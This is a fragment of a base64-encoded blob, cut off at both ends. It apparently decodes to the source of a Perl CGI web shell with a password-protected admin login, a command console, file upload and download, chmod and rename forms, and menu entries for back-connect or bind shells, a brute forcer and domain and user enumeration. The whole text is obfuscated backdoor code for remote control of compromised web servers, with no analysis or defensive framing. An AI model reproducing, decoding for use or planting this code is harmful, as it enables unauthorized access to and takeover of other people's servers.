VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlUGVybXNfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nJyBtZXRob2Q9J1BPU1QnPjxpbnB1dCBpZD10ZXh0XyIgKyBpICsgIiAgbmFtZT1jaG1vZCB0eXBlPXRleHQgc2l6ZT01IC8+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIHZhbHVlPU9LPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJEVuY29kZUN1cnJlbnREaXInPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWYgdmFsdWU9JyIrZmlsZSsiJz48L2Zvcm0+IjsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidGV4dF8iICsgaSkuZm9jdXMoKTsNCn0NCmZ1bmN0aW9uIHJtX2NobW9kX2Zvcm0ocmVzcG9uc2UsaSxwZXJtcyxmaWxlKQ0Kew0KCXJlc3BvbnNlLmlubmVySFRNTCA9ICI8c3BhbiBvbmNsaWNrPVxcXCJjaG1vZF9mb3JtKCIgKyBpICsgIiwnIisgZmlsZSsgIicpXFxcIiA+IisgcGVybXMgKyI8L3NwYW4+PC90ZD4iOw0KfQ0KZnVuY3Rpb24gcmVuYW1lX2Zvcm0oaSxmaWxlLGYpDQp7DQoJZi5yZXBsYWNlKC9cXFxcL2csIlxcXFxcXFxcIik7DQoJdmFyIGJhY2s9InJtX3JlbmFtZV9mb3JtKCIraSsiLFxcXCIiK2ZpbGUrIlxcXCIsXFxcIiIrZisiXFxcIik7IHJldHVybiBmYWxzZTsiOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlXyIraSkuaW5uZXJIVE1MPSI8Zm9ybSBuYW1lPUZvcm1QZXJtc18iICsgaSsgIiBhY3Rpb249JycgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9cmVuYW1lIHR5cGU9dGV4dCB2YWx1ZT0gJyIrZmlsZSsiJyAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyB2YWx1ZT1PSz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGJhY2sgKyAiJyB2YWx1ZT1DYW5jZWw+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0nZ3VpJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kIHZhbHVlPSckRW5jb2RlQ3VycmVudERpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0ZXh0XyIgKyBpKS5mb2N1cygpOw0KfQ0KZnVuY3Rpb24gcm1fcmVuYW1lX2Zvcm0oaSxmaWxlLGYpDQp7DQoJaWYoZj09J2YnKQ0KCXsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0kRW5jb2RlQ3VycmVudERpciZjPWVkaXQlMjAiK2ZpbGUrIiUyMCc+IiArZmlsZSsgIjwvYT4iOw0KCX1lbHNlDQoJew0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGEgaHJlZj0nP2E9Z3VpJmQ9IitmKyInPlsgIiArZmlsZSsgIiBdPC9hPiI7DQoJfQ0KfQ0KPC9zY3JpcHQ+DQo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgYmdjb2xvcj0iIzBjMGMwYyIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4NCjxjZW50ZXI+PGNvZGU+DQo8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iMTAwJSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIyIj4NCjx0cj4NCgk8dGQgYWxpZ249ImNlbnRlciIgcm93c3Bhbj0zPg0KCQk8Yj48Zm9udCBzaXplPSIzIj49LS1bICAkRWRpdFBlcnNpb24gXS0tPTwvZm9udD48L2I+DQoJPC90ZD4NCgk8dGQ+DQoJCSRpbmZvDQoJPC90ZD4NCgk8dGQ+U2VydmVyIElQOjxmb250IGNvbG9yPSJyZWQiPiAkRU5WeydTRVJWRVJfQUREUid9PC9mb250PiB8IFlvdXIgSVA6IDxmb250IGNvbG9yPSJyZWQiPiRFTlZ7J1JFTU9URV9BRERSJ308L2ZvbnQ+DQoJPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiI+DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24iPkhvbWU8L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1jb21tYW5kJmQ9JEVuY29kZUN1cnJlbnREaXIiPkNvbnNvbGU8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWd1aSZkPSRFbmNvZGVDdXJyZW50RGlyIj5HVUk8L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT11cGxvYWQmZD0kRW5jb2RlQ3VycmVudERpciI+VXBsb2FkIEZpbGU8L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZkPSRFbmNvZGVDdXJyZW50RGlyIj5Eb3dubG9hZCBGaWxlPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1iYWNrYmluZCI+QmFjayAmIEJpbmQ8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJydXRlZm9yY2VyIj5CcnV0ZSBGb3JjZXI8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWNoZWNrbG9nIj5DaGVjayBMb2c8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvbWFpbnN1c2VyIj5Eb21haW5zL1VzZXJzPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1sb2dvdXQiPkxvZ291dDwvYT4gfA0KPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9Ii4uL2Vycm9yX2xvZy5waHAiPkhlbHA8L2E+DQo8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIj4NCiRpZA0KPC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPGZvbnQgaWQ9IlJlc3BvbnNlRGF0YSIgY29sb3I9IiNGRkZGRkYiID4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5TY3JlZW4NCnsNCglwcmludCA8PEVORDsNCjxwcmU+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KVHlwaW5nVGV4dCA9IGZ1bmN0aW9uKGVsZW1lbnQsIGludGVydmFsLCBjdXJzb3IsIGZpbmlzaGVkQ2FsbGJhY2spIHsNCiAgaWYoKHR5cGVvZiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCA9PSAidW5kZWZpbmVkIikgfHwgKHR5cGVvZiBlbGVtZW50LmlubmVySFRNTCA9PSAidW5kZWZpbmVkIikpIHsNCiAgICB0aGlzLnJ1bm5pbmcgPSB0cnVlOwkvLyBOZXZlciBydW4uDQogICAgcmV0dXJuOw0KICB9DQogIHRoaXMuZWxlbWVudCA9IGVsZW1lbnQ7DQogIHRoaXMuZmluaXNoZWRDYWxsYmFjayA9IChmaW5pc2hlZENhbGxiYWNrID8gZmluaXNoZWRDYWxsYmFjayA6IGZ1bmN0aW9uKCkgeyByZXR1cm47IH0pOw0KICB0aGlzLmludGVydmFsID0gKHR5cGVvZiBpbnRlcnZhbCA9PSAidW5kZWZpbmVkIiA/IDEwMCA6IGludGVydmFsKTsNCiAgdGhpcy5vcmlnVGV4dCA9IHRoaXMuZWxlbWVudC5pbm5lckhUTUw7DQogIHRoaXMudW5wYXJzZWRPcmlnVGV4dCA9IHRoaXMub3JpZ1RleHQ7DQogIHRoaXMuY3Vyc29yID0gKGN1cnNvciA/IGN1cnNvciA6ICIiKTsNCiAgdGhpcy5jdXJyZW50VGV4dCA9ICIiOw0KICB0aGlzLmN1cnJlbnRDaGFyID0gMDsNCiAgdGhpcy5lbGVtZW50LnR5cGluZ1RleHQgPSB0aGlzOw0KICBpZih0aGlzLmVsZW1lbnQuaWQgPT0gIiIpIHRoaXMuZWxlbWVudC5pZCA9ICJ0eXBpbmd0ZXh0IiArIFR5cGluZ1RleHQuY3VycmVudEluZGV4Kys7DQogIFR5cGluZ1RleHQuYWxsLnB1c2godGhpcyk7DQogIHRoaXMucnVubmluZyA9IGZhbHNlOw0KICB0aGlzLmluVGFnID0gZmFsc2U7DQogIHRoaXMudGFnQnVmZmVyID0gIiI7DQogIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7DQogIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciA9ICIiOw0KfQ0KVHlwaW5nVGV4dC5hbGwgPSBuZXcgQXJyYXkoKTsNClR5cGluZ1RleHQuY3VycmVudEluZGV4ID0gMDsNClR5cGluZ1RleHQucnVuQWxsID0gZnVuY3Rpb24oKSB7DQogIGZvcih2YXIgaSA9IDA7IGkgPCBUeXBpbmdUZXh0LmFsbC5sZW5ndGg7IGkrKykgVHlwaW5nVGV4dC5hbGxbaV0ucnVuKCk7DQp9DQpUeXBpbmdUZXh0LnByb3RvdHlwZS5ydW4gPSBmdW5jdGlvbigpIHsNCiAgaWYodGhpcy5ydW5uaW5nKSByZXR1cm47DQogIGlmKHR5cGVvZiB0aGlzLm9yaWdUZXh0ID09ICJ1bmRlZmluZWQiKSB7DQogICAgc2V0VGltZW91dCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJyIgKyB0aGlzLmVsZW1lbnQuaWQgKyAiJykudHlwaW5nVGV4dC5ydW4oKSIsIHRoaXMuaW50ZXJ2YWwpOwkvLyBXZSBoYXZlbid0IGZpbmlzaGVkIGxvYWRpbmcgeWV0LiAgSGF2ZSBwYXRpZW5jZS4NCiAgICByZXR1cm47DQogIH0NCiAgaWYodGhpcy5jdXJyZW50VGV4dCA9PSAiIikgdGhpcy5lbGVtZW50LmlubmVySFRNTCA9ICIiOw0KLy8gIHRoaXMub3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0LnJlcGxhY2UoLzwoW148XSkqPi8sICIiKTsgICAgIC8vIFN0cmlwIEhUTUwgZnJvbSB0ZXh0Lg0KICBpZih0aGlzLmN1cnJlbnRDaGFyIDwgdGhpcy5vcmlnVGV4dC5sZW5ndGgpIHsNCiAgICBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiPCIgJiYgIXRoaXMuaW5UYWcpIHsNCiAgICAgIHRoaXMudGFnQnVmZmVyID0gIjwiOw0KICAgICAgdGhpcy5pblRhZyA9IHRydWU7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiPiIgJiYgdGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgKz0gIj4iOw0KICAgICAgdGhpcy5pblRhZyA9IGZhbHNlOw0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLnRhZ0J1ZmZlcjsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMuaW5UYWcpIHsNCiAgICAgIHRoaXMudGFnQnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIiYiICYmICF0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiYiOw0KICAgICAgdGhpcy5pbkhUTUxFbnRpdHkgPSB0cnVlOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjsiICYmIHRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gIjsiOw0KICAgICAgdGhpcy5pbkhUTUxFbnRpdHkgPSBmYWxzZTsNCiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy5IVE1MRW50aXR5QnVmZmVyOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIHsNCiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgfQ0KICAgIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSB0aGlzLmN1cnJlbnRUZXh0Ow0KICAgIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgKz0gKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCAtIDEgPyAodHlwZW9mIHRoaXMuY3Vyc29yID09ICJmdW5jdGlvbiIgPyB0aGlzLmN1cnNvcih0aGlzLmN1cnJlbnRUZXh0KSA6IHRoaXMuY3Vyc29yKSA6ICIiKTsNCiAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgc2V0VGltZW91dCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJyIgKyB0aGlzLmVsZW1lbnQuaWQgKyAiJykudHlwaW5nVGV4dC5ydW4oKSIsIHRoaXMuaW50ZXJ2YWwpOw0KICB9IGVsc2Ugew0KCXRoaXMuY3VycmVudFRleHQgPSAiIjsNCgl0aGlzLmN1cnJlbnRDaGFyID0gMDsNCiAgICAgICAgdGhpcy5ydW5uaW5nID0gZmFsc2U7DQogICAgICAgIHRoaXMuZmluaXNoZWRDYWxsYmFjaygpOw0KICB9DQp9DQo8L3NjcmlwdD4NCjwvcHJlPg0KDQo8YnI+DQoNCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NCm5ldyBUeXBpbmdUZXh0KGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJoYWNrIiksIDMwLCBmdW5jdGlvbihpKXsgdmFyIGFyID0gbmV3IEFycmF5KCJfIiwiIik7IHJldHVybiAiICIgKyBhcltpLmxlbmd0aCAlIGFyLmxlbmd0aF07IH0pOw0KVHlwaW5nVGV4dC5ydW5BbGwoKTsNCg0KPC9zY3JpcHQ+DQpFTkQNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgZW5jb2RlIGh0bWwgc3BlY2lhbCBjaGFycw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFVybEVuY29kZSgkKXsNCglteSAkc3RyID0gc2hpZnQ7DQoJJHN0ciA9fiBzLyhbXkEtWmEtejAtOV0pL3NwcmludGYoIiUlJTAyWCIsIG9yZCgkMSkpL3NlZzsNCglyZXR1cm4gJHN0cjsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQWRkIGh0bWwgc3BlY2lhbCBjaGFycw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEh0bWxTcGVjaWFsQ2hhcnMoJCl7DQoJbXkgJHRleHQgPSBzaGlmdDsNCgkkdGV4dCA9fiBzLyYvJmFtcDsvZzsNCgkkdGV4dCA9fiBzLyIvJnF1b3Q7L2c7DQoJJHRleHQgPX4gcy8nLyYjMDM5Oy9nOw0KCSR0ZXh0ID1+IHMvPC8mbHQ7L2c7DQoJJHRleHQgPX4gcy8+LyZndDsvZzsNCglyZXR1cm4gJHRleHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEFkZCBsaW5rIGZvciBkaXJlY3RvcnkNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBBZGRMaW5rRGlyKCQpDQp7DQoJbXkgJGFjPXNoaWZ0Ow0KCW15IEBkaXI9KCk7DQoJaWYoJFdpbk5UKQ0KCXsNCgkJQGRpcj1zcGxpdCgvXFwvLCRDdXJyZW50RGlyKTsNCgl9ZWxzZQ0KCXsNCgkJQGRpcj1zcGxpdCgiLyIsJnRyaW0oJEN1cnJlbnREaXIpKTsNCgl9DQoJbXkgJHBhdGg9IiI7DQoJbXkgJHJlc3VsdD0iIjsNCglmb3JlYWNoIChAZGlyKQ0KCXsNCgkJJHBhdGggLj0gJF8uJFBhdGhTZXA7DQoJCSRyZXN1bHQuPSI8YSBocmVmPSc/YT0iLiRhYy4iJmQ9Ii5lbmNvZGVfYmFzZTY0KCRwYXRoKS4iJz4iLiRfLiRQYXRoU2VwLiI8L2E+IjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KCXByaW50IDw8RU5EOw0KDQoNClBhc3N3b3JkOjxicj4NCkxvZ2luIGluY29ycmVjdDxicj48YnI+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5Gb3JtDQp7DQoJcHJpbnQgPDxFTkQ7DQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+DQpMb2dpbiA6IEFkbWluaXN0cmF0b3I8YnI+DQpQYXNzd29yZDo8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InAiPg0KPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIGZvb3RlciBmb3IgdGhlIEhUTUwgUGFnZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUZvb3Rlcg0Kew0KCXByaW50ICI8YnI+DQoJPGZvbnQgY29sb3I9cmVkPj08L2ZvbnQ+PGZvbnQgY29sb3I9cmVkPi0tLSZndDsqICA8Zm9udCBjb2xvcj0jZmY5OTAwPlBhc3M6IGoqciogPC9mb250PiAgKiZsdDstLS09PC9mb250PjwvY29kZT4NCjwvY2VudGVyPjwvYm9keT48L2h0bWw+IjsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUNCiMgdmFyaWFibGUgJENvb2tpZXN7Jyd9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgR2V0Q29va2llcw0Kew0KCUBodHRwY29va2llcyA9IHNwbGl0KC87IC8sJEVOVnsnSFRUUF9DT09LSUUnfSk7DQoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykNCgl7DQoJCSgkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7DQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dvdXRTY3JlZW4NCnsNCglwcmludCAiQ29ubmVjdGlvbiBjbG9zZWQgYnkgZm9yZWlnbiBob3N0Ljxicj48YnI+IjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBMb2dzIG91dCB0aGUgdXNlciBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGxvZ2luIGFnYWluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ291dA0Kew0KCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUNCgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJJlByaW50TG9nb3V0U2NyZWVuOw0KDQoJJlByaW50TG9naW5TY3JlZW47DQoJJlByaW50TG9naW5Gb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQoJZXhpdDsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBsb2dpbiB0aGUgdXNlci4gSWYgdGhlIHBhc3N3b3JkIG1hdGNoZXMsIGl0DQojIGRpc3BsYXlzIGEgcGFnZSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBydW4gY29tbWFuZHMuIElmIHRoZSBwYXNzd29yZCBkb2Vucyd0DQojIG1hdGNoIG9yIGlmIG5vIHBhc3N3b3JkIGlzIGVudGVyZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlcg0KIyB0byBsb2dpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dpbiANCnsNCglpZigkTG9naW5QYXNzd29yZCBlcSAkUGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZA0KCXsNCgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRMb2dpblBhc3N3b3JkO1xuIjsNCgkJJlByaW50UGFnZUhlYWRlcjsNCgkJcHJpbnQgJkxpc3REaXI7DQoJfQ0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkJJlByaW50TG9naW5TY3JlZW47DQoJCWlmKCRMb2dpblBhc3N3b3JkIG5lICIiKSAjIHNvbWUgcGFzc3dvcmQgd2FzIGVudGVyZWQNCgkJew0KCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOw0KDQoJCX0NCgkJJlByaW50TG9naW5Gb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCQlleGl0Ow0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgY29tbWFuZHMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCW15ICRkaXI9ICI8c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPiIuJkFkZExpbmtEaXIoImNvbW1hbmQiKS4iPC9zcGFuPiI7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nI0ZGRkZGRic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iIG9uU3VibWl0PSJFbmNvZGVyKCdjJykiPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+DQoNCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU